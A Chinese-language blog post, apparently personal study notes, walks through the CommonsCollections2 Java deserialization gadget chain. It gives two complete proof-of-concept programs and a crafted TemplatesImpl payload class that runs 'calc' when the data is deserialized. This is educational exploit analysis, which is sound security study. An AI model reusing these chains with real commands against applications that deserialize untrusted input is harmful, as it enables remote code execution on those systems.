---
title: CommonsCollections2
date: 2023-06-23 14:05:51
tags: Java
cover: https://raw.githubusercontent.com/todis21/image/main/wallhaven-yjvgzd_2560x1600.png
---

# CommonsCollections2

## 前言

很久没学习了，对java的反序列化的知识很陌生，学习一下CC2，打好基础 ,篇幅不多贵在记录

## 环境搭建

CC2使用的是`javassist`和`PriorityQueue`来构造利用链；
并且使用的是`commons-collections-4.0`版本，而3.1-3.2.1版本中`TransformingComparator`并没有去实现`Serializable`接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本

* java 1.8_111
* commons-collections4

在maven项目中的pom文件中添加下面两个依赖

```
<dependency>
      <groupId>org.apache.commons</groupId>
      <artifactId>commons-collections4</artifactId>
      <version>4.0</version>
    </dependency>

    <dependency>
      <groupId>org.javassist</groupId>
      <artifactId>javassist</artifactId>
      <version>3.22.0-GA</version>
    </dependency>
```





## 字节码编程

简单认识一下字节码编程：

字节码编程与反射有一点类似，但是要比反射机制更加强大。

在反射机制中，可以动态加载类、创建对象，获得类的方法和属性。反射机制是在一个已经被创建好的类上进行操作。然而在字节码编程中，我们不仅可以动态的加载类，还可以依据我们的需求，在程序的运行过程中，创建一个新的类，也可以给修改或添加任何一个类的方法和属性。

[参考](https://songly.blog.csdn.net/article/details/118944928)

## 分析

先编写一个恶意类：

```
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class Evi extends AbstractTranslet{
    public  Evi() {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

这里留个疑问，为什么恶意类要继承`AbstractTranslet` 

根据网上先辈们的分析，主要利用了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`这个类

这个类中存在一个`defineTransletClasses`方法，loader.defineClass()方法返回的值存储在_class中，参数`_bytecodes`是一个字节码

大概是将`_bytecodes`中存储的恶意字节码转换为Class对象，并存入_class属性中

![image-20230623181252085](https://raw.githubusercontent.com/todis21/image/main/image-20230623181252085.png)



存储了有啥用呢？如果这个字节码是恶意的字节码，也需要加载才能利用啊

继续看`TemplatesImpl`类的另外一个方法`getTransletInstance`

![image-20230623182540379](https://raw.githubusercontent.com/todis21/image/main/image-20230623182540379.png)

这个方法中调用了刚刚的`defineTransletClasses`方法，把字节码转换为Class对象，并存入_class属性中

然后调用了`newInstance`加载Class对象

思路到这里就可以先构造一下POC

先把开始构造的恶意类转换成字节码

```java
ClassPool classPool = ClassPool.getDefault();
CtClass ctClass = classPool.getCtClass("org.example.Evi");
byte[] bytes = ctClass.toBytecode();
```

通过反射给私有属性`_bytecodes`赋值

```java
Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
Constructor<?> constructor = aClass.getDeclaredConstructor(new Class[]{});//获取私有的有参构造方法
Object TemplatesImpl_instance = constructor.newInstance();
//将恶意类的字节码设置给_bytecodes属性
Field bytecodes = aClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
bytecodes.set(TemplatesImpl_instance, new byte[][]{bytes});
```

在`getTransletInstance()`中，如果`_name`为空就`return`结束了，如下图

所以还要给`_name`赋值,这里赋值随便

```java
Field name = aClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(TemplatesImpl_instance, "Evi");
```

![image-20230623220242028](https://raw.githubusercontent.com/todis21/image/main/image-20230623220242028.png)

到这里，看看有什么方法能够调用`getTransletInstance()`,因为这个是个私有的方法，要是能够找到一个`public`的方法调用它就好了

在同一个类里边找到了`newTransformer()`方法，符合要求

![image-20230623221024999](https://raw.githubusercontent.com/todis21/image/main/image-20230623221024999.png)



现在要解决的是怎么调用这个方法

我尝试使用反射的方法调用，但是不知道出了什么问题，用不了，先在这里留个坑，整明白再补,代码如下：

```java
// 调用newTransformer()方法
Method newTransformerMethod = aClass.getMethod("newTransformer");
newTransformerMethod.setAccessible(true);
Transformer transformer = (Transformer) newTransformerMethod.invoke(TemplatesImpl_instance);
```



另寻出路

`newTransformer()`方法返回的是`transformer`,这个很难不让人想起CC1中的transformer数组，

`InvokerTransformer`类中有一个`transform`方法会根据传入的`iMethodName`，`iParamTypes`，`iArgs`这三个成员属性来执行class对象的某个方法，并且这三个属性是根据InvokerTransformer类的构造传入的，然后通过`InvokerTransformer`类的`transform`方法来调用`newTransformer`方法。

自己的想法(想直接用transform，但是没成功，第二个坑)：
```
new InvokerTransformer("newTransformer", null, null).transform(TemplatesImpl_instance);
```

网上先辈的：使用`TransformingComparator`来调用`transform`

```java
InvokerTransformer transformer = new InvokerTransformer("newTransformer", null, null);
TransformingComparator transformer_comparator = new TransformingComparator(transformer);
```

![image-20230623231301740](https://raw.githubusercontent.com/todis21/image/main/image-20230623231301740.png)

`TransformingComparator`类是一个`Comparable `对象的`comparator`比较器，实现了`Serializable`接口

![image-20230623231607770](https://raw.githubusercontent.com/todis21/image/main/image-20230623231607770.png)

`TransformingComparator`类的compare方法中通过transformer属性来调用transform方法的，如果想要调用InvokerTransformer类的transform方法，可以把InvokerTransformer传给TransformingComparator类的构造来设置transformer属性

![image-20230623231840514](https://raw.githubusercontent.com/todis21/image/main/image-20230623231840514.png)

所以才有了上面的：

```java
InvokerTransformer transformer = new InvokerTransformer("newTransformer", null, null);
TransformingComparator transformer_comparator = new TransformingComparator(transformer);
```



下一步：如何调用`TransformingComparator`的`compare`方法？

根据POC 这里使用的是PriorityQueue集合，PriorityQueue是一个优先队列，每次排序都会触发comparator比较器的compare方法，并且PriorityQueue还重写了readObject方法（反序列化漏洞必要的利用条件）。

![image-20230624152437651](https://raw.githubusercontent.com/todis21/image/main/image-20230624152437651.png)

这里使用了`heapify()`方法，该方法里面调用了siftDown()

![image-20230624152601658](https://raw.githubusercontent.com/todis21/image/main/image-20230624152601658.png)

查看siftDown():

![image-20230624152721157](https://raw.githubusercontent.com/todis21/image/main/image-20230624152721157.png)

其中`siftDownUsingComparator`方法里存在我们想要的`compare`方法，并且参数可控

![image-20230624152823718](https://raw.githubusercontent.com/todis21/image/main/image-20230624152823718.png)

后面的有点看不懂了，参考先辈的原话：

从siftDown方法中可以看出PriorityQueue队列中的comparator属性是一个比较器并且还是可控的，如果comparator属性指定为TransformingComparator比较器的话，不就可以调用TransformingComparator的compare方法了吗，于是万能的反射再次登场了，通过反射将PriorityQueue队列中的comparator属性设置为TransformingComparator比较器，这样PriorityQueue集合在反序列化过程中就会调用comparator比较器了，不得不说PriorityQueue集合完美的符合我们需要构造的利用链。

```java
 //触发漏洞
PriorityQueue queue = new PriorityQueue(2);
queue.add(1);
queue.add(1);

//设置comparator属性
Field field = queue.getClass().getDeclaredField("comparator");
field.setAccessible(true);
field.set(queue, transformer_comparator);

//设置queue属性
field = queue.getClass().getDeclaredField("queue");
field.setAccessible(true);
//队列至少需要2个元素
Object[] objects = new Object[]{TemplatesImpl_instance, TemplatesImpl_instance};
field.set(queue, objects);
```



然后就是序列化和反序列化：

```java
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(queue);
oos.close();

ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
Object object = ois.readObject();
```

运行结果：

![image-20230624154542498](https://raw.githubusercontent.com/todis21/image/main/image-20230624154542498.png)



## 完整POC

```java
package org.example;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class App {
    public static void main(String[] args) throws Exception {
        //构造恶意类TestTemplatesImpl并转换为字节码
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.getCtClass("org.example.Evi");
        byte[] bytes = ctClass.toBytecode();

        //反射创建TemplatesImpl
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Constructor<?> constructor = aClass.getDeclaredConstructor(new Class[]{});
        Object TemplatesImpl_instance = constructor.newInstance();
        //将恶意类的字节码设置给_bytecodes属性
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(TemplatesImpl_instance, new byte[][]{bytes});
        //设置属性_name为恶意类名
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(TemplatesImpl_instance, "Evi");

        //构造利用链
        InvokerTransformer transformer = new InvokerTransformer("newTransformer", null, null);
        TransformingComparator transformer_comparator = new TransformingComparator(transformer);
        //触发漏洞
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        //设置comparator属性
        Field field = queue.getClass().getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, transformer_comparator);

        //设置queue属性
        field = queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        //队列至少需要2个元素
        Object[] objects = new Object[]{TemplatesImpl_instance, TemplatesImpl_instance};
        field.set(queue, objects);

        //序列化 ---> 反序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object object = ois.readObject();
    }
}

```





恶意类：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class Evi extends AbstractTranslet{
    public  Evi() {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```





## 另外一种思路

先上POC ，这个是Y4tacker大佬写的，学习一下

```java
package org.example;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

public class App {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Comparator comparator = new TransformingComparator(transformerChain);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

        setFieldValue(transformerChain, "iTransformers", transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}

```

他没有使用`javassist`将恶意的类转为字节码加载，而是直接使用CC6中使用到的`ChainedTransformer`获取恶意代码

```java
public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Comparator comparator = new TransformingComparator(transformerChain);
```





然后后面的基本思路都差不多

详细的可以参考他的[分析](https://github.com/Y4tacker/JavaSec/blob/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/CommonsCollections2/CommonsCollections2.md)  

